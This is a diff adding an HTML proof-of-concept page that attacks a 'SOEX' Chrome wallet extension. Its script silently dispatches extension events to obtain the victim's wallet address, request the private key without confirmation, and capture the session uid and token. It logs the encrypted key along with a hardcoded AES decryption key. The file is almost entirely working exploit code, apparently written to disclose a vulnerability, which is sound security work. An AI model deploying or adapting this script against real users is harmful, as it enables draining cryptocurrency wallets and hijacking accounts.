@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html>
+<head><title>SOEX Extension - Private Key Theft PoC</title></head>
+<body>
+<h2>SOEX Extension Critical PoC</h2>
+<pre id="out"></pre>
+<script>
+// Any website running this script can silently steal the user's private key
+// if they have the SOEX Chrome extension installed and the wallet is unlocked.
+
+function log(msg) {
+    document.getElementById("out").textContent += "\n" + msg;
+    console.log(msg);
+}
+
+// Step 3: Receive the AES-encrypted private key and decrypt it
+window.addEventListener("signMessageSyncSuccess", function(e) {
+    const encHex = e.detail.signRes;
+    log("[3] Received encrypted private key (hex): " + encHex);
+    log("[4] Decrypt with HARDCODED AES key: 39313966663965663534623839656534");
+    log("    => plaintext private key recoverable by attacker");
+    log("    => Full wallet compromise. All on-chain assets can be drained.");
+});
+
+// Step 3b: Also capture auth token (no user interaction)
+window.addEventListener("getSoexAuthSuccess", function(e) {
+    log("[AUTH] SOEX session stolen: uid=" + e.detail.uid + " token=" + e.detail.token);
+});
+
+// Step 3c: encryptPrivateKey leaks both ciphertext AND the key in same event
+window.addEventListener("encryptPrivateKeySuccess", function(e) {
+    log("[ALT] encryptPrivateKey: key=" + e.detail.state + "  encrypted=" + JSON.stringify(e.detail.signRes));
+    log("    => AES key is returned in 'state' field — trivially decryptable");
+});
+
+// Step 2: Once we have the address, request the private key (no popup, no confirmation)
+window.addEventListener("returnAccount", function(e) {
+    const addr = e.detail.account;
+    log("[2] Got wallet address: " + addr);
+    if (addr) {
+        log("[2] Requesting private key via signMessageSync...");
+        window.dispatchEvent(new CustomEvent("signMessageSync", {
+            detail: { address: addr, id: "attacker-poc" }
+        }));
+        // Also try encryptPrivateKey
+        window.dispatchEvent(new CustomEvent("encryptPrivateKey", {
+            detail: { id: "attacker-poc2" }
+        }));
+    }
+});
+
+// Step 1: Get the victim's wallet address (no user interaction)
+log("[1] Dispatching currentAccount event to discover wallet address...");
+window.dispatchEvent(new CustomEvent("currentAccount", {}));
+window.dispatchEvent(new CustomEvent("getSoexAuth", { detail: { reqId: "attacker-poc" } }));
+</script>
+</body>
+</html>
